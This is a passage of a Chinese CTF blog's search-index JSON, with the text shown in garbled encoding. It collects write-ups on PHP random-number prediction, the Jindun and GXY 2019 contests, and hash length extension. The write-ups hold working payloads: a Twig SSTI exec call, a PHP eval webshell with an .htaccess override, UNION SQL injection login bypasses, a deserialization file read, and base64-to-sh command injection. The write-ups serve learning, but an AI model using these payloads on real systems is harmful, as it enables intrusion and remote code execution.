çš„æµç¨‹ï¼š é€šè¿‡cookieå‰ç¼€çˆ†ç ´éšæœºæ•°çš„seedã€‚ä½¿ç”¨php_mt_seedå·¥å…·ã€‚ ç”¨seedç”Ÿæˆrandom(10)ï¼Œå¾—åˆ°æ‰€æœ‰å¯èƒ½çš„authkeyåç¼€ã€‚ ç»™è‡ªå·±çš„è´¦å·å‘é€ä¸€å°æ‰¾å›å¯†ç é‚®ä»¶ï¼Œå–å‡ºæ‰¾å›å¯†ç é“¾æ¥ã€‚ ç”¨ç”Ÿæˆçš„åç¼€çˆ†ç ´å‰6ä½ï¼ŒèŒƒå›´æ˜¯0x000000-0xffffffï¼Œå’Œæ‰¾å›å¯†ç urlæ‹¼æ¥ååšMD5æ±‚å‡ºsignã€‚ å°†æ±‚å‡ºçš„signå’Œæ‰¾å›å¯†ç é“¾æ¥ä¸­çš„signå¯¹æ¯”ï¼Œç›¸ç­‰å³åœæ­¢ï¼Œè·å–å½“å‰çš„authkeyã€‚ mt_rand()çš„ä¸€ç§æ–°æ€è·¯å‚è§Hgameä¸Šé¢çš„ä¸€é“é¢˜ï¼šhttps://www.moonback.xyz/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/#%E4%BA%8C%E5%8F%91%E5%85%A5%E9%AD%82%EF%BC%81 rand()å‡½æ•°å®‰å…¨åæ¥äº†è§£åˆ°è¿™ä¸ªå‡½æ•°åœ¨æŸäº›æ¡ä»¶ä¸‹ç”Ÿæˆçš„éšæœºæ•°ä¹Ÿæ˜¯å¯ä»¥é¢„æµ‹çš„ å…ˆè¯´ä¸‹åœ¨linuxä¸‹ï¼ŒPHP randå‡½æ•°åœ¨åº•å±‚ä½¿ç”¨çš„æ˜¯glibc rand()ï¼Œå®ƒä¼šä¿ç•™å‰é¢ç”Ÿæˆéšæœºæ•°çš„æ•°æ®ï¼Œä½œä¸ºåé¢éšæœºæ•°ç”Ÿæˆçš„ä¾æ®ï¼Œä»¥æ­¤ä¿è¯ä¼ªéšæœºæ•°çš„å‡åŒ€æ€§ï¼Œä½†è¿™æ ·ä¼šå¯¼è‡´ä¸¥é‡çš„å®‰å…¨é—®é¢˜ï¼Œä¹Ÿå°±æ˜¯å¦‚æœæˆ‘ä»¬çŸ¥é“å‰é¢ç”Ÿæˆçš„éšæœºåºåˆ—ï¼Œé‚£ä¹ˆå®Œå…¨å¯ä»¥é¢„æµ‹åé¢çš„éšæœºæ•°ï¼Œå…¬å¼ï¼š 1num[n] = (num[n-3] + num[n-31]) mod (MAX) ä¸¾ä¸ªä¾‹å­ï¼š 12345678910&lt;?php$num = array();//ç”Ÿæˆ50ä¸ªä¼ªéšæœºæ•°for ($i=0; $i &lt; 50; $i++) &#123; $num[$i] = rand(0,100000);&#125;for ($i=31; $i &lt; 50; $i++)&#123;echo &quot;ç¬¬&quot;.($i+1).&quot;ä¸ªéšæœºæ•°ï¼š&quot;.$num[$i].&quot;\\t&quot;.&quot;å‘å‰æ•°ç¬¬ä¸‰ä¸ªæ•°ï¼š&quot;.$num[$i-31].&quot;\\tå‘å‰æ•°ç¬¬31ä¸ªæ•°ï¼š&quot;.$num[$i-3].&quot;\\t%è®¡ç®—å:&quot;.(($num[$i-31]+$num[$i-3])%100000).&quot;\\n&quot;;&#125;?&gt; å¯ä»¥çœ‹åˆ°è™½ç„¶æœ‰å¯èƒ½æœ‰è¯¯å·®ï¼Œä½†è¯¯å·®éƒ½ä¸º1ï¼Œgtflyå¤§ä½¬ç»™çš„æç¤ºå¯ä»¥èƒ½ç²¾åº¦çš„é—®é¢˜æ„Ÿè§‰å¾ˆå¯¹ å†çœ‹ä¸€ä¸‹windowsï¼Œæ˜¯æ— æ³•ç”¨ä¸Šé¢çš„æ–¹å¼é¢„æµ‹çš„ï¼Œä½†æ˜¯å¯ä»¥çˆ†ç ´ è¯¦ç»†çœ‹ï¼šhttps://github.com/Sjord/crack-ezchatter-token å‚è€ƒï¼š https://www.freebuf.com/vuls/192012.html https://blog.cfyqy.com/article/5aa79cea.html https://xz.aliyun.com/t/31 http://wonderkun.cc/index.html/?p=585 https://xz.aliyun.com/t/1520#toc-10","categories":[],"tags":[{"name":"php","slug":"php","permalink":"http://www.m00nback.xyz/tags/php/"},{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"},{"name":"ä¼ªéšæœºæ•°","slug":"ä¼ªéšæœºæ•°","permalink":"http://www.m00nback.xyz/tags/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"}]},{"title":"æ²³å—çœç¬¬ä¸€å±Šé‡‘ç›¾æ¯éƒ¨åˆ†é¢˜ç›®writeup","slug":"jindun-2019-wp","date":"2019-12-24T03:06:26.000Z","updated":"2020-05-09T12:55:36.011Z","comments":true,"path":"2019/12/24/jindun-2019-wp/","link":"","permalink":"http://www.m00nback.xyz/2019/12/24/jindun-2019-wp/","excerpt":"å¤ªèœäº†ï¼å…¨ç¨‹æ‡µé€¼ï¼Œå•¥éƒ½æ²¡å¹²ï¼2333ã€‚ã€‚ã€‚è®°å½•ä¸‹å§ï¼æ”¶è·å¾ˆå¤šï¼","text":"å¤ªèœäº†ï¼å…¨ç¨‹æ‡µé€¼ï¼Œå•¥éƒ½æ²¡å¹²ï¼2333ã€‚ã€‚ã€‚è®°å½•ä¸‹å§ï¼æ”¶è·å¾ˆå¤šï¼ webwaimai2æ‰“å¼€å‘ç°å¥½åƒä¸€ä¸ªç«™ï¼Œæœ‰waimaiè¿™ä¸ªç›®å½•ï¼Œè®¿é—®å‘ç°æ˜¯ä¸ªç™»å½•æ¡† ä»»æ„è´¦å·éƒ½å¯ä»¥ç™»è¿›å»ï¼ŒTwigæ¨¡æ¿æ³¨å…¥(æ˜¯æ—¶å€™å­¦ä¸‹SSTIäº†)ï¼Œpayloadï¼š 1username&#x3D;&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;ls&quot;)&#125;&#125;&amp;password&#x3D;admin&amp;submit&#x3D;Login misckeyä¸åœ¨è¿™é‡ŒäºŒç»´ç ï¼Œæ‰«æï¼Œå‘ç°æ˜¯ä¸ªbingçš„æœç´¢ç½‘å€ å°†må‚æ•°10è¿›åˆ¶è½¬asciiå­—ç¬¦å°±è¡Œ ä»å¨ƒå¨ƒæŠ“èµ·120086 1562 2535 5174bnhn s wwy vffg vffg rrhy fhnv æç¤ºè¯´flagä¸ºå°†å¾—åˆ°çš„è¿™å¥è¯MD5 32ä½åŠ å¯†çš„å†…å®¹ å‰ä¸€æ®µæ˜¯ä¸­æ–‡ç”µæŠ¥ç ï¼šè§£å¯†ç½‘å€ï¼Œè§£å‡ºäººå·¥æ™ºèƒ½ åä¸€æ®µæ˜¯äº”ç¬”å­—ï¼Œè§£å‡ºæ¥çš„ç»“æœæ˜¯ä¹Ÿè¦ä»å¨ƒå¨ƒæŠ“èµ·ï¼Œåœ¨çº¿äº”ç¬”è¾“å…¥ï¼šç½‘å€ ç„¶åMD5åŠ å¯†å°±å¯ä»¥å¾—åˆ°flag Hashcatç»™äº†ä¸€ä¸ªä¸çŸ¥é“æ˜¯å•¥çš„æ–‡ä»¶ï¼Œå¤šè¯•å‡ æ¬¡å§ï¼Œå‘ç°æ˜¯pptxï¼Œæœ‰å¯†ç ï¼Œç”¨aoprç ´è§£ ç ´è§£å‡ºå¯†ç æ˜¯9919ï¼Œæ‰“å¼€ï¼Œå‘ç°ç¬¬ä¸ƒé¡µæœ‰æ–‡æœ¬æ¡† æ”¹ä¸‹å­—ä½“é¢œè‰²ï¼Œå‡ºç°flag æˆ‘åƒä¸‰æ˜æ²»é¢˜ç›®æ˜¯ä¸€å¼ jpgå›¾ç‰‡ï¼Œç”¨hxdæˆ–è€…stringså‘ç°ä¸²ç‰¹æ®Šçš„å­—ç¬¦ä¸² base32è§£å¯†å¾—åˆ°flag cryptoappleç»™äº†ä¸€æ®µåƒbase64çš„ä¸œè¥¿ï¼ŒTkVLTFccSx1RAwFWDVcFDg0NAwIIWAZccyRzcydzIHUuKHxyLjA=ï¼Œç›´æ¥è§£ç ä¼šä¹±ç  è„šæœ¬æ„æ€å°±æ˜¯å°†è§£å‡ºæ¥çš„ä¹±ç ä¸è‡ªå·±çš„ä¸‹æ ‡åŠ ä¸ŠæŸä¸ªå€¼å¼‚æˆ–ï¼Œç„¶åæ‹¼æ¥ 123456789101112import base64s&#x3D;&#39;TkVLTFccSx1RAwFWDVcFDg0NAwIIWAZccyRzcydzIHUuKHxyLjA&#x3D;&#39;s&#x3D;base64.b64decode(s)for i in range(256): flag&#x3D;&quot;&quot; k&#x3D;0 for j in s: res&#x3D;j^(k+i) flag+&#x3D;chr(res) k+&#x3D;1 print(i,flag) å¯†ç å­¦é™„ä»¶ç»™äº†ä¸‰æ®µå¯†ç ï¼Œclear_info.txt crypt_info.txt true_crypto.txtï¼Œtrue_crypto.txtå†…å®¹åƒæ˜¯DESå¯†ç  å‘ç°clear_info.txtå’Œcrypt_info.txtå†…å®¹é•¿åº¦ç›¸åŒéƒ½ä¸º79ï¼Œè¯•è¯•å¼‚æˆ–å§ 123456789101112131415161718s1&#x3D;open(&quot;clear_info.txt&quot;,&quot;r&quot;).read()s2&#x3D;open(&quot;crypt_info.txt&quot;,&quot;r&quot;).read()flag&#x3D;&quot;&quot;li1&#x3D;[i for i in s1]li2&#x3D;[i for i in s2]for s1,s2 in zip(li1,li2): s&#x3D;ord(s1)^ord(s2) flag+&#x3D;chr(s)print(flag)fg&#x3D;&quot;&quot;for tr in flag: if tr&lt;&#x3D;&quot;Z&quot; and tr&gt;&#x3D;&quot;A&quot;: fg+&#x3D;&quot;A&quot; elif tr&lt;&#x3D;&quot;z&quot; and tr&gt;&#x3D;&quot;a&quot;: fg+&#x3D;&quot;B&quot; else: fg+&#x3D;&quot;&quot;print(fg) å¼‚æˆ–åçš„ç»“æœå¤§å°å†™äº¤å‰ï¼Œè¯•è¯•åŸ¹æ ¹å¯†ç å§ è§£å¯†åœ°å€ï¼šç½‘å€ï¼Œè§£å¯†ç»“æœä¸ºï¼šDESISAMUSING Desè§£ä¸‹å¯†ï¼Œè§£å¯†åœ°å€ï¼šç½‘å€ bj-å¯†æ–‡æ‰“å¼€å‘ç°æ˜¯ 45 45 45 45 45 32 45 46 46 45 32 45 45 46 46 46 32 46 46 46 45 45 32 45 45 46 46 46 32 45 45 45 45 46 32 45 46 46 46 46 32 46 32 45 45 46 46 46 32 46 46 46 46 45 32 45 45 46 46 46 32 45 46 46 46 32 45 46 46 46 46 32 46 45 32 46 46 46 46 45 32 45 45 45 46 46 32 46 46 46 46 45 32 45 45 45 46 46 32 46 46 46 45 45 32 46 46 46 45 45 32 45 46 46 46 46 32 45 46 46 46 32 46 46 46 46 45 32 46 32 46 46 46 46 46 32 45 46 46 46 46 32 46 46 46 46 45 32 45 46 46 32 46 46 46 46 45 32 45 46 46 32 46 46 46 46 46 32 45 45 46 46 46 32 46 46 46 45 45 32 46 46 46 45 45 32 45 46 46 46 46 32 45 46 46 46 46 32 46 46 46 45 45 32 45 45 45 45 45 32 46 46 46 46 45 32 46 46 45 45 45 32 45 46 46 46 46 32 46 46 46 45 45 32 45 46 46 46 46 32 46 45 45 45 45 32 45 45 46 46 46 32 45 46 46 åªæœ‰45ï¼Œ46ï¼Œ32ä¸‰ç§æ•°å­—è€Œå…¶å¯¹åº”çš„ASCIIç æ­£æ˜¯- . è„šæœ¬æ›¿æ¢å°±å¥½ 12345s&#x3D;open(&quot;bj.txt&quot;,&quot;r&quot;).read()flag&#x3D;&quot;&quot;for tr in s.split(&quot; &quot;): flag+&#x3D;chr(int(tr))print(flag) å¾—åˆ°æ‘©æ–¯å¯†ç ï¼Œè§£å¯†å¾—åˆ°0X73796E747B6A4848336B4E564D4D573366304263617Dï¼Œåº”è¯¥æ˜¯16è¿›åˆ¶ï¼Œ16è¿›åˆ¶è½¬å­—ç¬¦è¯•è¯•ï¼Œå¾—åˆ°synt&#123;jHH3kNVMMW3f0Bca&#125;ï¼Œç„¶åæ˜¯å‡¯æ’’ç§»ä½åŠ å¯†ï¼Œå¯†ç ä¸º13å¾—åˆ°flagï¼Œflag&#123;wUU3xAIZZJ3s0Opn&#125; å°æ˜çš„ç”Ÿæ—¥ç»™äº†ä¸ªMD5ï¼Œ0175501585710a89h5a60dc9ed2f88d7ï¼Œè§£ä¸å‡ºæ¥ï¼Œæç¤ºè¯´æ˜¯ç”Ÿæ—¥ï¼Œå¹¶ä¸”å‰å››ä½æ˜¯1997ï¼Œ å†™ä¸ªè„šæœ¬è·‘ä¸‹å§ 12345678910111213141516171819202122232425262728import hashlibimport difflibflag&#x3D;&quot;0175501585710a89h5a60dc9ed2f88d7&quot;def md5(key): m &#x3D; hashlib.md5() m.update(key.encode(&#39;utf-8&#39;)) return m.hexdigest()dic&#x3D;&#123;&#125;birthday&#x3D;&#39;1997&#39;for i in range(1,13): for j in range(1,32): s1&#x3D;&quot;&quot; s2&#x3D;&quot;&quot; if i&lt;10: s1&#x3D;&#39;0&#39;+str(i) else: s1&#x3D;str(i) if j&lt;10: s2&#x3D;&#39;0&#39;+str(j) else: s2&#x3D;str(j) bit&#x3D;birthday+s1+s2 dic[bit]&#x3D;difflib.SequenceMatcher(None, flag,md5(bit)).quick_ratio()for k in sorted(dic,key&#x3D;dic.__getitem__,reverse&#x3D;True): print(k,dic[k]) ç¬¬ä¸€ä¸ªå°±æ˜¯æœ€ç›¸ä¼¼çš„md5","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"}]},{"title":"GXYå®‰æ’æ¯æœˆèµ›2019éƒ¨åˆ†é¢˜ç›®writeup","slug":"gxy-2019-wp","date":"2019-12-21T13:43:34.000Z","updated":"2020-05-16T08:12:31.326Z","comments":true,"path":"2019/12/21/gxy-2019-wp/","link":"","permalink":"http://www.m00nback.xyz/2019/12/21/gxy-2019-wp/","excerpt":"æˆ‘å¥½èœï¼æˆ‘å¥½èœï¼æˆ‘å¥½èœï¼é‡è¦çš„äº‹æƒ…è¯´ä¸‰éï¼Œæ¯”èµ›æ”¶è·å¾ˆå¤šï¼ï¼ï¼æ€»ç»“ä¸€ä¸‹ï¼Œæ”¶è·äº†å¤§å‹æ¯”èµ›çš„ä¸€è¡€ï¼Œä½†ä¹Ÿå°±æ­£å„¿å…«ç»çš„åšå‡ºè¿™ä¸€é“ï¼2333â€¦.","text":"æˆ‘å¥½èœï¼æˆ‘å¥½èœï¼æˆ‘å¥½èœï¼é‡è¦çš„äº‹æƒ…è¯´ä¸‰éï¼Œæ¯”èµ›æ”¶è·å¾ˆå¤šï¼ï¼ï¼æ€»ç»“ä¸€ä¸‹ï¼Œæ”¶è·äº†å¤§å‹æ¯”èµ›çš„ä¸€è¡€ï¼Œä½†ä¹Ÿå°±æ­£å„¿å…«ç»çš„åšå‡ºè¿™ä¸€é“ï¼2333â€¦. webç¦æ­¢å¥—å¨ƒï¼ä¹‹å‰åšè¿‡è¿™ç§ç±»å‹ï¼Œè„‘å­æ··äº†ï¼å“ï¼ WPå‚è§ï¼šhttp://www.moonback.xyz/2019/11/12/php-nopara-rce/#GXY-å®‰æ’æœˆèµ› babyuploadè¿™é¢˜å°±æ˜¯æˆ‘æ‹¿åˆ°ä¸€è¡€çš„é¢˜ç›®ï¼Œå°å¼€å¿ƒï¼å˜»å˜»å˜»ï¼ å…¶å®è¿™é¢˜ä¸éš¾ï¼ŒMIME+.htaccess+æ£€æµ‹å†…å®¹php bpå¼€ä¸¤ä¸ªintruderï¼Œä¸€ä¸ªä¸Šä¼ .htaccess(æ³¨æ„MIME)ï¼Œä¸€ä¸ªä¸Šä¼ å›¾ç‰‡é©¬(æ£€æŸ¥&lt;?php?&gt;)ï¼Œåå°ä¼šåˆ é™¤ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæ‰€ä»¥æ¡ä»¶ç«äº‰ï¼Œç„¶åèšå‰‘è¿å°±è¡Œ .htaccess 123&lt;FilesMatch &quot;jpg|png|gif&quot;&gt; SetHandler application&#x2F;x-httpd-php &lt;&#x2F;FilesMatch&gt; å›¾ç‰‡é©¬ï¼š 12GIF89a&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;a&#x27;]);&lt;/script&gt; BabySqliæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°ç‰¹æ®Šå­—ç¬¦ä¸²ï¼Œå…ˆbase32è§£å¯†ï¼Œå†base64è§£å¯†å¾—åˆ°ï¼š 1select * from user where username = &#x27;$name&#x27; å‘Šè¯‰æˆ‘ä»¬æ•°æ®åº“ä¸ºuserï¼Œåˆ—æœ‰usernameè¿™åˆ—ï¼ŒçŒœæµ‹passwordçš„éªŒè¯æ˜¯å’Œusernameåˆ†ç¦»çš„ å…ˆfuzzä¸€ä¸‹sqlå…³é”®å­— å‘ç°è¿‡æ»¤äº†å°æ‹¬å·ï¼Œor,order,=,for,information åæ¥çœ‹äº†wpæ‰çŸ¥é“ï¼Œè¿‡æ»¤åœ¨sqlä¹‹åï¼Œå…¶å®ä¹Ÿèƒ½è¯•å‡ºæ¥ï¼Œä¸‹å›¾æˆåŠŸå»¶æ—¶ è¿™æ ·å°±ç›¸å½“äºæ²¡è¿‡æ»¤å•Šï¼Œç›´æ¥sqlmapä¸€æŠŠæ¢­ï¼Œèƒ½è·‘å‡ºè´¦å·çš„MD5ï¼Œä½†æ˜¯è§£ä¸å‡ºæ¥ æ—¢ç„¶æ˜¯passwordçš„éªŒè¯æ—¶åˆ†ç¦»çš„ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥ä¼ªé€ ä¸€ä¸ªç”¨æˆ·ï¼Œä¸Šé¢è·‘ä¸è·‘æ— æ‰€è°“ ç”¨unionæŸ¥è¯¢å°±è¡Œï¼Œæ³¨æ„åˆ—è¦å¯¹åº”ï¼Œpayloadï¼Œmd5ä¸º123456åŠ å¯†åçš„å€¼ï¼š 1name&#x3D;&#39;union select 1,&quot;admin&quot;,&quot;e10adc3949ba59abbe56e057f20f883e&quot;%23&amp;pw&#x3D;123456 ä¸ºå•¥å¯ä»¥è¿™æ ·ï¼Ÿ åç«¯å°†æ¥æ”¶åˆ°çš„password md5åŠ å¯†ä¸ä¸Šæ¬¡æŸ¥è¯¢çš„ç»“æœæ¯”è¾ƒï¼Œæˆ‘ä»¬å°±å¯ä»¥è”åˆæŸ¥è¯¢ä¼ªé€ ä¸€ä¸ªç”¨æˆ·è¿›è¡Œç»•è¿‡ æ— æƒ…çš„æŠ¥èœåæœºå™¨ååºåˆ—åŒ–ï¼Œdirsearchæ‰«åˆ°index.php~ 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?php class FileReader&#123; public $Filename; public $start; public $max_length; function __construct()&#123; $this-&gt;Filename = __DIR__ . &quot;/bcm.txt&quot;; $this-&gt;start = 12; $this-&gt;max_length = 72; &#125; function __wakeup()&#123; $this-&gt;Filename = __DIR__ . &quot;/fake_f1ag.php&quot;; $this-&gt;start = 10; $this-&gt;max_length = 0; echo &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;; &#125; function __destruct()&#123; $data = file_get_contents($this-&gt;Filename, 0, NULL, $this-&gt;start, $this-&gt;max_length); if(preg_match(&quot;/\\&#123;|\\&#125;/&quot;, $data))&#123; die(&quot;you can&#x27;t read flag!&quot;); &#125; else&#123; echo $data; &#125; &#125;&#125;if(isset($_GET[&#x27;exp&#x27;]))&#123; if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#x27;exp&#x27;]))&#123; die(&quot;hack!&quot;); &#125; $exp = $_REQUEST[&#x27;exp&#x27;]; $e = unserialize($exp); echo $e-&gt;Filename;&#125;else&#123; $exp = new FileReader();&#125;?&gt; é¦–å…ˆè¦ç»•è¿‡å¯¹expçš„æ­£åˆ™ï¼Œå‘ç°expå¯ä»¥é€šè¿‡POSTæäº¤è¿‡å»ï¼Œå¾ˆå®¹æ˜“ç»•è¿‡ï¼Œå…¶æ¬¡è¦ç»•è¿‡__wakeupå‡½æ•°ï¼Œè¿™ä¸ªç›´æ¥æ”¹ä¸‹æ•°å­—å¤§å°å°±è¡Œï¼Œè¯»æ–‡ä»¶çš„æ—¶å€™å¯ä»¥ç”¨php://filterè¿›è¡ŒåŠ å¯†ç»•è¿‡å¯¹&#123;&#125;çš„è¿‡æ»¤ payload: http://183.129.189.60:10004/index.php?exp=1 POST:exp=O:10:&quot;FileReader&quot;:4:&#123;s:8:&quot;Filename&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;s:5:&quot;start&quot;;i:0;s:10:&quot;max_length&quot;;i:1000;&#125; I can ping you!é¢˜ç›®æ˜¯çœ‹ä¸åˆ°æºç çš„ï¼Œå’±ä»¬ç›´æ¥æ‹¿æºç æ¥çœ‹ 123456789101112131415161718192021&lt;?phpif(isset($_GET[&#x27;ip&#x27;]))&#123;$ip = $_GET[&#x27;ip&#x27;];if(preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;1f&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match))&#123; echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match); die(&quot;fxck your symbol!&quot;);&#125;else if(preg_match(&quot;/ /&quot;, $ip))&#123; die(&quot;fxck your space!&quot;);&#125;else if(preg_match(&quot;/bash/&quot;, $ip))&#123; die(&quot;fxck your bash!&quot;);&#125;else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123; die(&quot;fxck your flag!&quot;);&#125;$a = shell_exec(&quot;ping -c 4 &quot;.$ip);echo &quot;&lt;pre&gt;&quot;;print_r($a);&#125;?&gt; è¿‡æ»¤äº†ä¸€å¤§å †ä¸œè¥¿ payload: 1?ip=;cat$IFS`ls` æˆ–è€… 1?ip=||echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh Y2F0IGZsYWcucGhwæ˜¯cat flag.phpçš„æ„æ€ miscä½›ç³»é’å¹´è¿™é¢˜ç›´æ¥binwalkå‹ç¼©åŒ…ä¼šå¡ä½ï¼Œæ•²ä¸‹å›è½¦å°±è¡Œï¼Œåˆ†ç¦»å‡ºä¸‰ä¸ªæ–‡ä»¶ fo.txté‡Œé¢æœ‰ä¸ä½›è®ºç¦…åŠ å¯†ï¼Œæ‹¿åˆ°è¿™é‡Œè§£å¯†ä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°flag å…¶å®è¿™é¢˜çš„çœŸæ­£è€ƒç‚¹æ˜¯zipä¼ªåŠ å¯†ï¼Œç”¨binwalkåˆ†ç¦»å‡ºçš„0.zipæ˜¯ç»è¿‡zipä¼ªåŠ å¯†çš„ï¼Œæˆ‘æ˜¯ç”¨çš„winrarä¿®å¤çš„ï¼Œæ¯”å¯¹ä¸€ä¸‹ä¸¤ä¸ªæ–‡ä»¶ï¼Œå‘ç°åªæœ‰ä¸€å¤„ä¸åŒï¼Œå³å…¨å±€æ–¹å¼ä½æ ‡è®°ä¸åŒ(ç”¨äºåŒºåˆ†æ˜¯å¦æœ‰åŠ å¯†)ï¼Œ00 00ä»£è¡¨æ— åŠ å¯†ï¼Œ00 09ä»£è¡¨æœ‰åŠ å¯†ï¼Œå› æ­¤ä¹Ÿå¯ä»¥æ‰‹åŠ¨ä¿®æ”¹ï¼Œå…³äºzipä¼ªåŠ å¯†çš„ï¼Œå‚è§ï¼šlink gakkiè§£å‹å‘ç°æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œbinwalkä¸€ä¸‹ï¼Œåˆ†ç¦»å‡ºå‹ç¼©åŒ… æ˜¯æœ‰åŠ å¯†çš„ï¼Œæ²¡ä»€è«æ€è·¯ï¼Œæ˜¯ä¸æ˜¯ç®€å•çš„å¯†ç ï¼Ÿè¯•è¯•å‘— å¯†ç ä¸º8864ï¼Œæ‰“å¼€flag.txtå‘ç°å¥½åƒä¹±ç çš„ä¸œè¥¿ ç¥é­”åŠ å¯†å‘¢ï¼Ÿä¸ç®—æ˜¯åŠ å¯† è¿™äº›å­—ç¬¦å…¶å®æ˜¯ç”±flagçš„å†…å®¹ï¼Œé¡ºåºæ˜¯æŒ‰ç…§å‡ºç°çš„æ¬¡æ•°ä»å¤§åˆ°å°æ’åºï¼Œä¸Šè„šæœ¬å§ 1234567fp=open(&#x27;flag.txt&#x27;,&#x27;r&#x27;).read()print(fp)dic=&#123;&#125;for tr in fp: dic[tr]=fp.count(tr)for k in sorted(dic,key=dic.__getitem__,reverse=True): print(k,end=&quot;&quot;) äººç”Ÿè‹¦çŸ­æˆ‘ç”¨python SXMgdGhpcyBiYXNlPw==æœ¬é¢˜æ˜¯base64éšå†™ï¼Œé¢˜ç›®å†…å®¹ å…³äºbase64éšå†™çš„å†…å®¹ï¼Œå‚è§è¿™ä½å¤§ä½¬çš„blog è¿™é“é¢˜ç›´æ¥ç”¨è„šæœ¬è·‘å°±è¡Œ 123456789101112import base64bin_str=&#x27;&#x27;b64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;with open(&#x27;code.txt&#x27;,&#x27;r&#x27;) as f: for line in f.readlines(): stegb64=&quot;&quot;.join(line.split()) rowb64=&quot;&quot;.join(str(base64.b64encode(base64.b64decode(stegb64)),&#x27;utf-8&#x27;).split()) offset=abs(b64chars.index(stegb64.replace(&#x27;=&#x27;,&#x27;&#x27;)[-1])-b64chars.index(rowb64.replace(&#x27;=&#x27;, &#x27;&#x27;)[-1])) equalnum=line.count(&#x27;=&#x27;) if equalnum: bin_str += bin(offset)[2:].zfill(equalnum * 2) print(&#x27;&#x27;.join([chr(int(bin_str[i:i + 8], 2)) for i in range(0,len(bin_str),8)]))","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"GXY","slug":"GXY","permalink":"http://www.m00nback.xyz/tags/GXY/"}]},{"title":"å“ˆå¸Œæ‰©å±•é•¿åº¦æ”»å‡»å­¦ä¹ ","slug":"hash-extend-attack","date":"2019-12-16T11:28:59.000Z","updated":"2020-04-23T07:20:13.665Z","comments":true,"path":"2019/12/16/hash-extend-attack/","link":"","permalink":"http://www.m00nback.xyz/2019/12/16/hash-extend-attack/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†hashæ‰©å±•é•¿åº¦æ”»å‡»ä¸»è¦æ–¹å¼åŠåŸç†ï¼ï¼ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†hashæ‰©å±•é•¿åº¦æ”»å‡»ä¸»è¦æ–¹å¼åŠåŸç†ï¼ï¼ï¼ hashåŸç† é¦–å…ˆï¼Œå½“hashå‡½æ•°æ‹¿åˆ°éœ€è¦è¢«hashçš„å­—ç¬¦ä¸²åï¼Œå…ˆå°†å…¶å­—èŠ‚é•¿åº¦æ•´é™¤64ï¼Œå–å¾—ä½™æ•°ã€‚å¦‚æœè¯¥ä½™æ•°æ­£å¥½ç­‰äº56ï¼Œé‚£ä¹ˆå°±åœ¨è¯¥å­—ç¬¦ä¸²æœ€åæ·»åŠ ä¸Š8ä¸ªå­—èŠ‚çš„é•¿åº¦æè¿°ç¬¦ï¼ˆå…·ä½“ç”¨bitè¡¨ç¤ºï¼‰ã€‚å¦‚æœä¸ç­‰äº56ï¼Œå°±å…ˆå¯¹å­—ç¬¦ä¸²è¿›è¡Œé•¿åº¦å¡«å……ï¼Œå¡«å……æ—¶ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ºhex(80)ï¼Œå…¶ä»–å­—èŠ‚å‡ç”¨hex(00)å¡«å……ï¼Œå¡«å……è‡³ä½™æ•°ä¸º56åï¼ŒåŒæ ·å¢åŠ 8ä¸ªå­—èŠ‚çš„é•¿åº¦æè¿°ç¬¦ï¼ˆè¯¥é•¿åº¦æè¿°ç¬¦ä¸ºéœ€è¦è¢«hashçš„å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œä¸æ˜¯å¡«å……ä¹‹åæ•´ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ï¼‰ã€‚ä»¥ä¸Šè¿‡ç¨‹ï¼Œç§°ä¹‹ä¸ºè¡¥ä½ã€‚ è¡¥ä½å®Œæˆåï¼Œå­—ç¬¦ä¸²ä»¥64ä½ä¸€ç»„è¿›è¡Œåˆ†ç»„ï¼ˆå› ä¸ºä¸Šé¢çš„ä½™æ•°ä¸º56,åŠ ä¸Š8ä¸ªå­—èŠ‚çš„é•¿åº¦æè¿°ç¬¦åï¼Œæ­£å¥½æ˜¯64ä½ï¼Œå‡‘æˆä¸€ç»„ï¼‰ã€‚å­—ç¬¦ä¸²èƒ½è¢«åˆ†æˆå‡ 